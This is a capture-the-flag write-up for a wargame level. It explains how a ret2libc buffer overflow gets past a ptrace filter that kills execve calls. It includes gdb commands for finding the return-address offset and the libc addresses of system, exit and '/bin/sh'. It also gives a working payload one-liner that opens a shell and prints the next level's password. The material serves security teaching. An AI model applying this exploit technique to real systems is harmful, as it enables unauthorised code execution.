This time, the program displays "Give me some shellcode, k" and waits for user's input. When filling in a random string, the program displays "child is exiting..." and exits. 

Looking at the [source code](source.c), we see that the program creates a child process using fork(). The user's input is registered using gets() in the child process (which, once again, is vulnerable to buffer overflow attacks). Meanwhile, the parent process checks what the child process is doing with the ptrace(PTRACE_PEEKUSER, ...) command: when a system call occurs in the child process, the kernel saves the original contents of the eax register, which contains the system call number. Here, the child process is killed if the system call number is 11 (= execve). This is a kind of protection to prevent us from exploiting the binary file with the execve() command.

We could approach this exercise in different ways, for example by writing shellcode that does not call execve() but rather system(). But we'll do something else, because we've never tried that before and it looks like fun: a ret2libc attack. It's basically the same as exploiting the return address of the vulnerable function contained in eip, except that instead of putting there the address a shellcode we wrote, we'll go and get the addresses (in this case, the address of system() and an address that points to "/bin/sh") somewhere else in the memory. I used [this article](https://bufferoverflows.net/ret2libc-exploitation-example/) as a guide.

As we have already done before, we use gdb to find the offset of eip which contains the return address of the function. Small particularity here, we use the `set follow-fork-mode child` command to follow the child process:

```
(gdb) set follow-fork-mode child
(gdb) r < <(python -c 'print "A" * 156 + "aaaa"')
Starting program: /home/users/level04/level04 < <(python -c 'print "A" * 156 + "aaaa"')
[New process 2334]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2334]
child is exiting...
0x61616161 in ?? ()
```

So we have an offset of 156 bytes. Now let's find the addresses of system() and exit(), as well as an address that contains "/bin/sh". Why exit() ? So that our call to system() is cleaner. Indeed, when calling system(), in addition to the parameter, we must pass it a return address. We could pass it anything and then the program would crash after the call to system(), but if we're going to do it, we might as well do it right.

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
```

We can now build our payload: first, 156 bytes of padding to reach eip, followed by the address of system(), then the return address (so in our case, exit()), and finally, the parameter of the call to system(): the memory address containing "/bin/sh".

```
level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
We can now reach the next level with the command `su level05` and fill in the flag found as a password.